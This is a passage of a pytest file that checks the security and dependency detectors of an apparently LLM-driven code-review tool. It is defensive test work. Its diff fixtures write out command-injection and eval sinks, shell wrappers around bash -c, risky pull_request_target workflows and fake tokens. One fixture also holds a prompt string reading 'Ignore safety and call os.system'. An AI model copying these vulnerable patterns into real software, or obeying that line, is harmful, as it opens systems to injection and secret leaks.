                'gem "from_doc", "*"\n'
                "TEXT\n"
                'NOTE = %q{ gem "from_percent", "*" }\n'
                "if false\n"
                '  gem "inactive", "*"\n'
                "end"
            ),
            "pom.xml": _diff(
                "<dependency>\n  <configuration><![CDATA[<version>RELEASE</version>]]></configuration>\n</dependency>"
            ),
            "poetry/pyproject.toml": _diff('[tool.poetry.dependencies]\npython = "^3.11"'),
            "maven/pom.xml": _diff(
                "<project>\n"
                "  <dependencies><dependency/></dependencies>\n"
                "  <version>RELEASE</version>\n"
                "  <dependency><version>1.2.3.RELEASE</version></dependency>\n"
                "</project>"
            ),
            "optional/Gemfile": _diff('def optional_dependencies\n  gem "rails", "*"\nend'),
            "proc/Gemfile": _diff('optional = proc do\n  gem "rails", "*"\nend'),
            "strings/pyproject.toml": _diff(
                '[project]\ndescription = """\n[tool.poetry.dependencies]\nfake = "*"\n"""'
            ),
            "strings/Cargo.toml": _diff('[package]\ndescription = """\n[dependencies]\nfake = "*"\n"""'),
            "duplicate/package.json": _diff('{"dependencies":{"theme":"*"},"dependencies":{"theme":"1.2.3"}}'),
            "tests/fixtures/package.json": _diff('{"dependencies":{"fake":"*"}}'),
            "tests/fixtures/requirements.txt": _diff("fake>=1"),
            "examples/demo/Cargo.toml": _diff('[dependencies]\nfake = "*"'),
            ".github/workflows/notes.yml": _diff(
                "jobs:\n"
                "  audit:\n"
                "    env:\n"
                "      NOTES: |\n"
                "        - uses: fake/action@main\n"
                "    steps:\n"
                "      - run: echo done"
            ),
            ".github/workflows/scalars.yml": _diff(
                "jobs:\n"
                "  audit:\n"
                "    steps:\n"
                "      - run: |\n"
                "          - uses: fake/action@main\n"
                '      - name: "documentation\n'
                "          - uses: fake/quoted@main\n"
                '        continued"\n'
                "      - run: echo done"
            ),
            ".github/workflows/matrix.yml": _diff(
                "jobs:\n"
                "  audit:\n"
                "    strategy:\n"
                "      matrix:\n"
                "        steps:\n"
                "          - uses: fake/matrix@main\n"
                "    steps:\n"
                "      - run: echo done"
            ),
            "Cargo.toml": _diff('[workspace.dependencies]\nserde = "*"\n[dependencies.hyper]\nversion = ">=0.13"'),
            "go.mod": _diff("require (\n  example.com/lib v1.2.3-beta\n)"),
        }
    )

    ranges = {(finding.file, finding.line) for finding in findings if finding.category == "dependency-version-range"}
    assert ranges == {
        ("Cargo.toml", 2),
        ("Cargo.toml", 4),
    }


def test_gemfile_condition_stack_ignores_end_tokens_inside_multiline_strings():
    findings = detect_dependency_findings(
        {
            "heredoc/Gemfile": _diff('if false\n  DOC = <<~TEXT\nend\nTEXT\n  gem "inactive", "*"\nend'),
            "percent-q/Gemfile": _diff('if false\n  DOC = %q{\nend\n}\n  gem "inactive", "*"\nend'),
        }
    )

    assert not [finding for finding in findings if finding.category == "dependency-version-range"]


def test_dependency_sections_do_not_cross_unknown_or_discontinuous_diff_context():
    findings = detect_dependency_findings(
        {
            "unknown/pyproject.toml": '@@ -100,0 +100,1 @@\n+target = "^1.0"',
            "gapped/pyproject.toml": (
                '@@ -10,1 +10,2 @@\n [tool.poetry.dependencies]\n+known = "^1.0"\n@@ -100,0 +100,1 @@\n+target = "^1.0"'
            ),
        }
    )

    ranges = [finding for finding in findings if finding.category == "dependency-version-range"]
    assert [(finding.file, finding.line) for finding in ranges] == [("gapped/pyproject.toml", 11)]


def test_dependency_detector_reports_actionable_ranges_and_workflow_context():
    sha = "b" * 40
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("unversioned-package\nflask>=2.0"),
            "Gemfile": _diff('gem "rack"\ngem "rails", "~> 7.0"\ngem "json", "3.0.0"'),
            "Cargo.toml": _diff('[dependencies]\nserde = "0.8"\nhyper = ">=0.13"\nfixed = "=1.2.3"'),
            "pom.xml": _diff("<dependency><version>[2.9,)</version></dependency>"),
            ".github/workflows/review.yml": _diff(
                "on:\n"
                "  pull_request_target:\n"
                "jobs:\n"
                "  audit:\n"
                "    steps:\n"
                "      - uses: actions/checkout@v3\n"
                "        with:\n"
                "          ref: ${{ github.event.pull_request.head.sha }}\n"
                "      - uses: owner/action@abcdef1\n"
                f"      - uses: owner/pinned@{sha}\n"
                '      - run: echo "token=${{ secrets.API_TOKEN }}"\n'
                '      - run: deploy "${{ github.event.pull_request.title }}"'
            ),
        }
    )

    categories = _cats(findings)
    assert "dependency" not in categories
    assert {"dependency-version-range", "ci-security", "data-leak"} <= categories
    workflow = [f for f in findings if f.file.endswith("review.yml")]
    assert len([f for f in workflow if f.category == "dependency-version-range"]) == 2
    assert len([f for f in workflow if f.category == "ci-security"]) == 2
    assert len([f for f in workflow if f.category == "data-leak"]) == 1
    assert all(f.confidence < 0.96 for f in workflow)


def test_workflow_context_does_not_correlate_distant_right_side_hunks():
    patch = (
        "@@ -0,0 +1,5 @@\n"
        "+on: pull_request_target\n"
        "+jobs:\n"
        "+  build:\n"
        "+    steps:\n"
        "+      - uses: actions/checkout@v3\n"
        "@@ -0,0 +100,1 @@\n"
        "+    ref: ${{ github.event.pull_request.head.sha }}\n"
    )

    findings = detect_dependency_findings({".github/workflows/review.yml": patch})

    assert "dependency-version-range" in _cats(findings)
    assert "ci-security" not in _cats(findings)


def test_detectors_use_right_side_lines_across_context_deletions_and_hunks():
    security_patch = (
        "@@ -10,3 +20,4 @@\n"
        " safe_context\n"
        "-old_value\n"
        '+token = "ghp_1234567890123456"\n'
        " keep_context\n"
        "+eval(user_input)\n"
        "@@ -100,2 +200,3 @@\n"
        " context\n"
        "+os.system(cmd)\n"
        " tail\n"
    )
    security = detect_security_findings({"app.py": security_patch})
    by_category = {(f.category, f.line) for f in security}
    assert ("hardcoded-secrets", 21) in by_category
    assert ("code-injection", 23) in by_category
    assert ("command-injection", 201) in by_category

    dependency_patch = "@@ -40,2 +80,3 @@\n requests==2.31.0\n+flask>=2.0\n keep\n"
    dependency = detect_dependency_findings({"requirements.txt": dependency_patch})
    assert dependency
    assert {f.line for f in dependency} == {81}


def test_detectors_skip_unanchored_and_deletion_only_patches():
    assert detect_security_findings({"app.py": "@@ fixture @@\n+eval(user_input)"}) == []
    assert detect_dependency_findings({"requirements.txt": "+flask>=2.0"}) == []
    assert detect_dependency_findings({"requirements.txt": "@@ -5,2 +5,1 @@\n keep\n-old"}) == []


def test_security_detector_ignores_safe_python_process_and_path_controls():
    findings = detect_security_findings(
        {
            "process_runner.py": _diff(
                "import os\n"
                "import subprocess\n"
                'subprocess.run(["wc", "-l", input_file], check=True)\n'
                'subprocess.Popen(["grep", user_data, "/var/log/app.log"])\n'
                'subprocess.run("ls -la /var/log", shell=True)\n'
                'subprocess.check_output(["ping", "-c", "1", host])\n'
                "original = os.system\n"
                'os.system("echo test")\n'
                "with open(tmp_path) as handle:\n"
                "    handle.read()"
            )
        }
    )

    assert not ({"command-injection", "path-traversal"} & _cats(findings))


def test_security_detector_keeps_dynamic_python_shell_sinks():
    findings = detect_security_findings(
        {
            "runner.py": _diff(
                'os.system("ping -c 1 " + host)\nos.popen(f"nslookup {domain}")\nsubprocess.run(command, shell=True)'
            )
        }
    )

    command_findings = [f for f in findings if f.category == "command-injection"]
    assert len(command_findings) == 3
    assert all(f.confidence >= 0.96 for f in command_findings)


def test_security_detector_drops_placeholders_and_calibrates_test_code():
    findings = detect_security_findings(
        {
            "tests/test_security_helpers.py": _diff(
                'TEST_API_KEY = "sk-test-not-a-real-key"\n'
                'TEST_PASSWORD = "test-password-123"\n'
                "eval(user_expression)\n"
                "os.system(user_command)"
            )
        }
    )

    assert "hardcoded-secrets" not in _cats(findings)
    assert {"code-injection", "command-injection"} <= _cats(findings)
    assert all(f.confidence <= 0.75 for f in findings)


def test_security_detector_auto_confirms_realistic_go_secret_even_when_unused():
    patch = _diff('package main\n\nfunc main() {\n    apiKey := "sk-proj-abc123def456ghi789jkl"\n}')

    findings = detect_security_findings({"main.go": patch})
    secrets = [finding for finding in findings if finding.category == "hardcoded-secrets"]

    assert [(finding.line, finding.confidence) for finding in secrets] == [(4, 0.97)]
    assert is_deterministic_security_finding("main.go", 4, "hardcoded-secrets", patch)


def test_security_detector_ignores_non_secret_go_configuration_values():
    findings = detect_security_findings(
        {
            "config.go": _diff(
                "package config\n"
                "\n"
                'const publicAPIKey = "public-client-identifier"\n'
                'const disabledToken = "disabled"\n'
                'var apiKey = os.Getenv("API_KEY")\n'
                'const featureName = "sk-projection-feature-name"'
            )
        }
    )

    assert "hardcoded-secrets" not in _cats(findings)


def test_secret_placeholder_markers_only_apply_to_literal_values_not_identifiers():
    real_findings = detect_security_findings(
        {
            "credentials.go": _diff(
                "package credentials\n"
                '\nvar unusedPassword = "correct-horse-battery-staple"\n'
                'var disabledApiKey = "sk-proj-real123456789abcdef"\n'
                'var redactedToken = "ghp_abcdefghijklmnop"'
            )
        }
    )

    assert {
        (finding.line, finding.confidence) for finding in real_findings if finding.category == "hardcoded-secrets"
    } == {
        (3, 0.92),
        (4, 0.97),
        (5, 0.97),
    }

    placeholder_findings = detect_security_findings(
        {
            "defaults.go": _diff(
                "package defaults\n"
                '\nvar password = "unused"\n'
                'var apiKey = "public-client-identifier"\n'
                'var token = "redacted"'
            )
        }
    )

    assert "hardcoded-secrets" not in _cats(placeholder_findings)


def test_security_detector_auto_confirms_ruby_open3_single_parameter_shell_command():
    patch = _diff(
        'require "open3"\n\nmodule JobRuntime\n  def self.capture(command)\n    Open3.capture3(command)\n  end\nend'
    )

    findings = detect_security_findings({"job_runtime.rb": patch})
    commands = [finding for finding in findings if finding.category == "command-injection"]

    assert [(finding.line, finding.confidence) for finding in commands] == [(5, 0.97)]
    assert is_deterministic_security_finding("job_runtime.rb", 5, "command-injection", patch)
    assert is_auto_confirmable_security_finding("job_runtime.rb", 5, "command-injection", patch)


def test_security_detector_auto_confirms_only_proven_ruby_system_parameter_flows():
    patch = _diff(
        "def direct(command)\n"
        "  system(command)\n"
        "end\n"
        "def kernel(command)\n"
        "  Kernel.system(command)\n"
        "end\n"
        "def aliased(input)\n"
        "  command = input\n"
        "  system(command)\n"
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"system_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert {(finding.line, finding.confidence) for finding in commands} == {
        (2, 0.97),
        (5, 0.97),
        (9, 0.97),
    }
    assert all(
        is_auto_confirmable_security_finding("system_runner.rb", line, "command-injection", patch) for line in (2, 5, 9)
    )


def test_security_detector_keeps_guarded_or_ambiguous_ruby_system_calls_contextual():
    patch = _diff(
        "ALLOWED_COMMANDS = ['git status'].freeze\n"
        "def guarded(command)\n"
        "  raise unless ALLOWED_COMMANDS.include?(command)\n"
        "  system(command)\n"
        "end\n"
        "def guarded_alias(input)\n"
        "  command = input\n"
        "  return unless SAFE_COMMANDS.include?(command)\n"
        "  system(command)\n"
        "end\n"
        "def reassigned(command)\n"
        '  command = "git status"\n'
        "  system(command)\n"
        "end\n"
        "def argv(revision)\n"
        '  system("git", "show", revision)\n'
        "end\n"
        "def custom(command)\n"
        "  runner.system(command)\n"
        "end\n"
        "def interpolated(command)\n"
        '  system("echo #{command}")\n'
        "end\n"
        "def variadic(*command)\n"
        "  system(command)\n"
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"guarded_system_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (4, 0.92),
        (9, 0.92),
        (19, 0.92),
        (22, 0.92),
        (25, 0.92),
    ]
    assert all(
        not is_auto_confirmable_security_finding(
            "guarded_system_runner.rb",
            finding.line,
            finding.category,
            patch,
        )
        for finding in commands
    )
    assert not any(finding.line in {13, 16} for finding in commands)


def test_security_detector_ignores_ruby_open3_static_and_shellless_argv_forms():
    findings = detect_security_findings(
        {
            "safe_runner.rb": _diff(
                'require "open3"\n'
                "\n"
                'command = "git status --short"\n'
                "Open3.capture3(command)\n"
                'Open3.capture3("git status --short")\n'
                'Open3.capture3("git", "show", revision)\n'
                'Open3.capture3({"LC_ALL" => "C"}, "git", "status")\n'
                'Open3.capture3(ENV.to_h, "git", "status")\n'
                'Open3.capture3("/usr/bin/env", "git", "status")\n'
                'Open3.capture3("python", "script.py", input)\n'
                'Open3.capture3("python", "-c", "print(1)")\n'
                'Open3.capture3("printf", "bash", "-c", command)\n'
                "\n"
                "def fixed_command(command)\n"
                '  command = "git status --short"\n'
                "  Open3.capture3(command)\n"
                "end"
            )
        }
    )

    assert "command-injection" not in _cats(findings)


def test_security_detector_keeps_ruby_open3_explicit_shell_wrappers_and_env_single_string():
    patch = _diff(
        'require "open3"\n'
        "\n"
        "def run(env, command)\n"
        '  Open3.capture3("bash", "-c", command)\n'
        '  Open3.capture3(env, "sh", "-lc", command)\n'
        "  Open3.capture3(env, command)\n"
        '  Open3.capture3(env, "git", "show", command)\n'
        '  Open3.capture3("/usr/bin/env", "bash", "-c", command)\n'
        '  Open3.capture3("python", "-c", command)\n'
        '  Open3.capture3("node", "-e", command)\n'
        '  Open3.capture3("env", command)\n'
        '  Open3.capture3("lua", "-e", command)\n'
        '  Open3.capture3(command, "--version")\n'
        "end"
    )

    findings = detect_security_findings({"shell_runner.rb": patch})
    commands = [finding for finding in findings if finding.category == "command-injection"]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (4, 0.97),
        (5, 0.9),
        (6, 0.9),
        (7, 0.9),
        (8, 0.97),
        (9, 0.97),
        (10, 0.97),
        (11, 0.97),
        (12, 0.97),
        (13, 0.97),
    ]
    assert all(
        is_deterministic_security_finding("shell_runner.rb", line, "command-injection", patch)
        for line in (4, 8, 9, 10, 11, 12, 13)
    )
    assert all(
        not is_deterministic_security_finding("shell_runner.rb", line, "command-injection", patch) for line in (5, 6, 7)
    )


def test_security_detector_fails_open_for_dynamic_wrappers_and_unwraps_env_options():
    patch = _diff(
        'require "open3"\n'
        "\n"
        "def run(shell, flag, command)\n"
        '  shell = "bash"\n'
        '  flag = "-c"\n'
        '  Open3.capture3(shell, "-c", command)\n'
        '  Open3.capture3("bash", flag, command)\n'
        '  Open3.capture3("env", "-i", "bash", "-c", command)\n'
        '  Open3.capture3("env", "-u", "PATH", "bash", "-c", command)\n'
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"dynamic_wrappers.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (6, 0.9),
        (7, 0.9),
        (8, 0.97),
        (9, 0.97),
    ]
    assert all(
        not is_deterministic_security_finding("dynamic_wrappers.rb", line, "command-injection", patch)
        for line in (6, 7)
    )
    assert all(
        is_deterministic_security_finding("dynamic_wrappers.rb", line, "command-injection", patch) for line in (8, 9)
    )


def test_security_detector_keeps_ambiguous_env_hash_variables_contextual_and_respects_command_guard():
    patch = _diff(
        "def run(env_hash, command)\n"
        '  Open3.capture3(env_hash, "git status")\n'
        "  raise unless ALLOWED_COMMANDS.include?(command)\n"
        "  Open3.capture3(env_hash, command)\n"
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"env_hash_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [(2, 0.9), (4, 0.9)]
    assert all(
        not is_deterministic_security_finding("env_hash_runner.rb", line, "command-injection", patch) for line in (2, 4)
    )


def test_security_detector_unwraps_only_known_ruby_command_launchers():
    patch = _diff(
        "def run(command)\n"
        '  Open3.capture3("busybox", "ash", "-c", command)\n'
        '  Open3.capture3("sudo", "bash", "-c", command)\n'
        '  Open3.capture3("sudo", "-u", "nobody", "bash", "-c", command)\n'
        '  Open3.capture3("timeout", "5", "bash", "-c", command)\n'
        '  Open3.capture3("env", "sudo", "bash", "-c", command)\n'
        '  Open3.capture3("my_wrapper", "bash", "-c", command)\n'
        '  Open3.capture3("logger", "bash", "-c", command)\n'
        '  Open3.capture3("printf", "bash", "-c", command)\n'
        '  Open3.capture3("sudo", "--edit", "bash", "-c", command)\n'
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"launcher_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (2, 0.97),
        (3, 0.97),
        (4, 0.97),
        (5, 0.97),
        (6, 0.97),
        (7, 0.9),
    ]
    assert all(
        is_deterministic_security_finding("launcher_runner.rb", line, "command-injection", patch)
        for line in range(2, 7)
    )
    assert not is_deterministic_security_finding("launcher_runner.rb", 7, "command-injection", patch)


def test_security_detector_keeps_known_ruby_command_forwarders_contextual():
    patch = _diff(
        "def run(command)\n"
        '  Open3.capture3("docker", "run", "image", "bash", "-c", command)\n'
        '  Open3.capture3("kubectl", "exec", "pod", "--", "sh", "-c", command)\n'
        '  Open3.capture3("find", ".", "-exec", "sh", "-c", command, ";")\n'
        '  Open3.capture3("chroot", "/srv/jail", "bash", "-c", command)\n'
        '  Open3.capture3("unshare", "--fork", "bash", "-c", command)\n'
        '  Open3.capture3("ssh", "host", command)\n'
        '  Open3.capture3("ssh", "host", command, "--verbose")\n'
        '  Open3.capture3("ssh", "-p", "22", "host", command, "arg")\n'
        '  Open3.capture3("docker", "run", "image", "bash", "-c", "echo safe")\n'
        '  Open3.capture3("ssh", "host", "uptime")\n'
        '  Open3.capture3("cat", "bash", "-c", command)\n'
        '  Open3.capture3("tar", "bash", "-c", command)\n'
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"forwarder_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (2, 0.9),
        (3, 0.9),
        (4, 0.9),
        (5, 0.9),
        (6, 0.9),
        (7, 0.9),
        (8, 0.9),
        (9, 0.9),
    ]
    assert all(
        not is_deterministic_security_finding("forwarder_runner.rb", line, "command-injection", patch)
        for line in range(2, 10)
    )


def test_security_detector_keeps_busybox_launcher_chains_and_env_split_string_contextual():
    patch = _diff(
        "def run(command)\n"
        '  Open3.capture3("busybox", "env", "bash", "-c", command)\n'
        '  Open3.capture3("busybox", "timeout", "5", "bash", "-c", command)\n'
        '  Open3.capture3("busybox", "nohup", "bash", "-c", command)\n'
        '  Open3.capture3("env", "-S", "bash -c", command)\n'
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"busybox_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (2, 0.97),
        (3, 0.97),
        (4, 0.97),
        (5, 0.9),
    ]
    assert all(
        is_deterministic_security_finding("busybox_runner.rb", line, "command-injection", patch) for line in range(2, 5)
    )
    assert not is_deterministic_security_finding("busybox_runner.rb", 5, "command-injection", patch)


def test_security_detector_keeps_ruby_interpreter_stdin_and_cmd_keep_open_modes():
    patch = _diff(
        "def run(command)\n"
        '  Open3.capture3("cmd", "/k", command)\n'
        '  Open3.capture3("cmd.exe", stdin_data: command)\n'
        '  Open3.capture3("sh", "-s", stdin_data: command)\n'
        '  Open3.capture3("bash", stdin_data: command)\n'
        '  Open3.capture3("sh", chdir: "/tmp", stdin_data: command)\n'
        '  Open3.capture3("python", "-", stdin_data: command)\n'
        '  Open3.capture3("python", "script.py", stdin_data: command)\n'
        '  Open3.capture3("sh", "-s", stdin_data: "echo safe")\n'
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"stdin_runner.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [
        (2, 0.97),
        (3, 0.97),
        (4, 0.97),
        (5, 0.97),
        (6, 0.97),
        (7, 0.97),
    ]
    assert all(
        is_deterministic_security_finding("stdin_runner.rb", line, "command-injection", patch) for line in range(2, 8)
    )


def test_security_detector_does_not_auto_confirm_guarded_ruby_open3_parameters():
    patches = {
        "allowlist_runner.rb": _diff(
            "ALLOWED_COMMANDS = ['git status', 'git log'].freeze\n"
            "def run(command)\n"
            '  raise ArgumentError, "unsupported" unless ALLOWED_COMMANDS.include?(command)\n'
            "  Open3.capture3(command)\n"
            "end"
        ),
        "match_runner.rb": _diff(
            "def run(command)\n  return unless command.match?(/\\A[a-z0-9_-]+\\z/)\n  Open3.capture3(command)\nend"
        ),
        "block_runner.rb": _diff(
            "def run(command)\n"
            "  unless SAFE_COMMANDS.include?(command)\n"
            '    raise "unsupported"\n'
            "  end\n"
            "  Open3.capture3(command)\n"
            "end"
        ),
        "case_runner.rb": _diff(
            "def run(command)\n"
            "  case command\n"
            "  when 'git status', 'git log'\n"
            "    Open3.capture3(command)\n"
            "  else\n"
            '    raise "unsupported"\n'
            "  end\n"
            "end"
        ),
    }

    findings = detect_security_findings(patches)
    commands = [finding for finding in findings if finding.category == "command-injection"]

    assert {(finding.file, finding.confidence) for finding in commands} == {
        ("allowlist_runner.rb", 0.9),
        ("match_runner.rb", 0.9),
        ("block_runner.rb", 0.9),
        ("case_runner.rb", 0.9),
    }
    assert all(
        not is_deterministic_security_finding(finding.file, finding.line, finding.category, patches[finding.file])
        for finding in commands
    )
    assert all(
        not is_auto_confirmable_security_finding(
            finding.file,
            finding.line,
            finding.category,
            patches[finding.file],
        )
        for finding in commands
    )


def test_security_detector_applies_ruby_open3_guards_to_parameter_aliases():
    guarded_patch = _diff(
        "def run(input)\n"
        "  command = input\n"
        "  raise unless ALLOWED_COMMANDS.include?(command)\n"
        "  Open3.capture3(command)\n"
        "end"
    )
    source_guarded_patch = _diff(
        "def run(input)\n"
        "  raise unless ALLOWED_COMMANDS.include?(input)\n"
        "  command = input\n"
        "  Open3.capture3(command)\n"
        "end"
    )
    unguarded_patch = _diff("def run(input)\n  command = input\n  Open3.capture3(command)\nend")

    guarded = [
        finding
        for finding in detect_security_findings({"guarded_alias.rb": guarded_patch})
        if finding.category == "command-injection"
    ]
    source_guarded = [
        finding
        for finding in detect_security_findings({"source_guarded_alias.rb": source_guarded_patch})
        if finding.category == "command-injection"
    ]
    unguarded = [
        finding
        for finding in detect_security_findings({"unguarded_alias.rb": unguarded_patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in guarded] == [(4, 0.9)]
    assert not is_deterministic_security_finding("guarded_alias.rb", 4, "command-injection", guarded_patch)
    assert [(finding.line, finding.confidence) for finding in source_guarded] == [(4, 0.9)]
    assert not is_deterministic_security_finding(
        "source_guarded_alias.rb", 4, "command-injection", source_guarded_patch
    )
    assert [(finding.line, finding.confidence) for finding in unguarded] == [(3, 0.97)]
    assert is_deterministic_security_finding("unguarded_alias.rb", 3, "command-injection", unguarded_patch)


def test_security_detector_does_not_treat_a_completed_case_as_a_dominating_guard():
    patch = _diff(
        "def run(command)\n"
        "  case command\n"
        "  when 'git status'\n"
        "    audit(command)\n"
        "  end\n"
        "  Open3.capture3(command)\n"
        "end"
    )

    commands = [
        finding
        for finding in detect_security_findings({"unguarded_after_case.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [(6, 0.97)]
    assert is_deterministic_security_finding("unguarded_after_case.rb", 6, "command-injection", patch)


@pytest.mark.parametrize(
    ("content", "sink_line"),
    [
        (
            "def run(command)\n  return unless command.match?(/\\A.*\\z/)\n  Open3.capture3(command)\nend",
            3,
        ),
        (
            "def run(command, audit_enabled)\n"
            "  if audit_enabled\n"
            "    return unless ALLOWED_COMMANDS.include?(command)\n"
            "  end\n"
            "  Open3.capture3(command)\n"
            "end",
            5,
        ),
        (
            "def run(command)\n  return unless command.match?(/^[a-z0-9_-]+$/)\n  Open3.capture3(command)\nend",
            3,
        ),
        (
            "def run(command)\n  return unless command.match?(/\\A[a-z0-9_\\s-]+\\z/)\n  Open3.capture3(command)\nend",
            3,
        ),
        (
            "def run(command, params)\n"
            "  return unless [params[:allowed]].include?(command)\n"
            "  Open3.capture3(command)\n"
            "end",
            3,
        ),
        (
            "def run(command, params)\n"
            "  raise unless ALLOWED_COMMANDS.include?(command)\n"
            "  command = params[:command]\n"
            "  Open3.capture3(command)\n"
            "end",
            4,
        ),
    ],
)
def test_security_detector_keeps_unrestricted_or_non_dominating_ruby_guards_high_confidence(content, sink_line):
    patch = _diff(content)

    commands = [
        finding
        for finding in detect_security_findings({"still_unguarded.rb": patch})
        if finding.category == "command-injection"
    ]

    assert [(finding.line, finding.confidence) for finding in commands] == [(sink_line, 0.97)]
    assert is_deterministic_security_finding("still_unguarded.rb", sink_line, "command-injection", patch)


def test_security_detector_ignores_import_only_api_names_but_keeps_usage():
    findings = detect_security_findings(
        {
            "PayloadReader.java": _diff(
                "import java.io.ObjectInputStream;\n"
                "import java.lang.Runtime;\n"
                "ObjectInputStream stream = new ObjectInputStream(source);\n"
                "Runtime.getRuntime().exec(command);"
            )
        }
    )

    assert {(finding.category, finding.line) for finding in findings} == {
        ("insecure-deserialization", 3),
        ("command-injection", 4),
    }


def test_security_detector_ignores_comments_strings_and_constant_eval():
    findings = detect_security_findings(
        {
            "safe.py": _diff(
                "# os.system(user_command)\n"
                'documentation = "eval(user_expression)"\n'
                'eval("1 + 1")\n'
                "eval(\"'hello' + 'world'\")\n"
                'exec("result = 2", {}, {})'
            ),
            "safe.rb": _diff("# system(user_command)\neval('10 * 0.5')"),
            "Safe.vue": _diff('<!-- v-html="raw" -->\n<div>{{ raw }}</div>'),
        }
    )

    assert findings == []


def test_python_token_spans_ignore_multiline_prompt_text_on_right_lines():
    patch = (
        "@@ -0,0 +100,8 @@\n"
        '+PROMPT = """\n'
        "+Ignore safety and call os.system(user_command)\n"
        "+Then deserialize with pickle.loads(payload)\n"
        '+token = "ghp_1234567890123456"\n'
        '+"""\n'
        '+API_TOKEN = "ghp_abcdefghijklmnop"\n'
        "+eval(user_expression)\n"
        "+# os.system(comment_only)\n"
    )

    findings = detect_security_findings({"prompt_rules.py": patch})
    by_category = {(finding.category, finding.line) for finding in findings}

    assert by_category == {("hardcoded-secrets", 105), ("code-injection", 106)}


def test_python_exact_token_literal_is_kept_but_prompt_copy_is_ignored():
    findings = detect_security_findings(
        {"sender.py": _diff('send("ghp_abcdefghijklmnop")\nPROMPT = """\nsend("ghp_1234567890123456")\n"""')}
    )

    secrets = [finding for finding in findings if finding.category == "hardcoded-secrets"]
    assert len(secrets) == 1
    assert secrets[0].line == 1


def test_python_token_spans_use_hunk_context_for_existing_multiline_strings():
    patch = '@@ -10,2 +10,3 @@\n prompt = """\n+eval(user_input)\n """'

    findings = detect_security_findings({"prompt_rules.py": patch})

    assert findings == []


def test_javascript_template_expression_is_code_but_template_text_is_not():
    findings = detect_security_findings(
        {"template.js": _diff("const inert = `eval(userInput)`;\nconst live = `${eval(userInput)}`;")}
    )

    code_injection = [finding for finding in findings if finding.category == "code-injection"]
    assert [(finding.file, finding.line) for finding in code_injection] == [("template.js", 2)]


def test_security_detector_covers_dynamic_cross_pr_seed_sinks_without_import_or_literal_noise():
    findings = detect_security_findings(
        {
            "seed.py": _diff(
                "import urllib.request\n"
                'with open(root + "/" + filename) as handle:\n'
                "    data = handle.read()\n"
                "urllib.request.urlopen(url)\n"
                'urllib.request.urlopen("https://example.invalid/health")'
            ),
            "seed.ts": _diff("import { exec } from 'child_process';\nexec(command);\nexec(\"echo safe\");"),
            "seed.go": _diff('import "net/http"\nhttp.Get(url)\nhttp.Get("https://example.invalid/health")'),
        }
    )

    assert {(finding.file, finding.line, finding.category) for finding in findings} == {
        ("seed.py", 2, "path-traversal"),
        ("seed.py", 4, "ssrf"),
        ("seed.ts", 2, "command-injection"),
        ("seed.go", 2, "ssrf"),
    }


def test_workflow_context_uses_existing_trigger_and_requires_checkout_ref_ownership():
    sha = "c" * 40
    existing_trigger_patch = (
        "@@ -1,6 +1,7 @@\n"
        " on:\n"
        "   pull_request_target:\n"
        " jobs:\n"
        "   audit:\n"
        "     steps:\n"
        f"       - uses: actions/checkout@{sha}\n"
        "+        ref: ${{ github.event.pull_request.head.sha }}\n"
    )
    unrelated_expression_patch = _diff(
        "on: pull_request_target\n"
        "jobs:\n"
        "  audit:\n"
        "    steps:\n"
        f"      - uses: actions/checkout@{sha}\n"
        "      - run: echo ${{ github.event.pull_request.head.sha }}\n"
        "      - run: echo done"
    )

    existing = detect_dependency_findings({".github/workflows/existing.yml": existing_trigger_patch})
    unrelated = detect_dependency_findings({".github/workflows/unrelated.yml": unrelated_expression_patch})

    assert [(finding.category, finding.line) for finding in existing] == [("ci-security", 7)]
    assert "ci-security" not in _cats(unrelated)


def test_xss_bypass_is_reserved_for_explicit_sanitizer_bypass():
    findings = detect_security_findings(
        {
            "view.js": _diff("return <div dangerouslySetInnerHTML={{__html: raw}} />"),
            "view.tsx": _diff(
                "return <div dangerouslySetInnerHTML={{__html: raw}} />\nsanitizer.bypassSecurityTrustHtml(raw)"
            ),
            "view.go": _diff("return template.HTML(raw)"),
            "view.vue": _diff('<component :is="name" />'),
            "safe-angular.ts": _diff('template: `<div [innerHTML]="raw"></div>`'),
        }
    )

    assert len([f for f in findings if f.category == "xss"]) == 4
    bypass = [f for f in findings if f.category == "xss-bypass"]
    assert len(bypass) == 1
    assert bypass[0].file == "view.tsx"
    assert all(finding.file != "safe-angular.ts" for finding in findings)


class EmptyLLM:
    async def ainvoke(self, _messages):
        return SimpleNamespace(content='{"findings":[]}')


class DiffGitHub:
    async def get_file_diff(self, _repo, _pr_number, file_path):
        assert file_path == "app.py"
        return _diff("def run(expr):\n    return eval(expr)")

    async def get_file_content(self, _repo, _ref, _file_path):
        return ""

    async def search_code(self, _repo, _pattern, _file_glob=""):
        return ""

    async def post_review_comment(self, **_kwargs):
        return {"id": 1}


@pytest.mark.asyncio
async def test_security_reviewer_merges_deterministic_detector_findings():
    registry = build_registry()
    reviewer = SecurityReviewer(EmptyLLM(), registry, ToolGateway(registry, DiffGitHub()))
    state = StateStore(repo="o/r", pr_number=1, head_sha="h", files_changed=["app.py"])

    findings = await reviewer.execute(ReviewTask(reviewer="security_reviewer", files=["app.py"]), state)

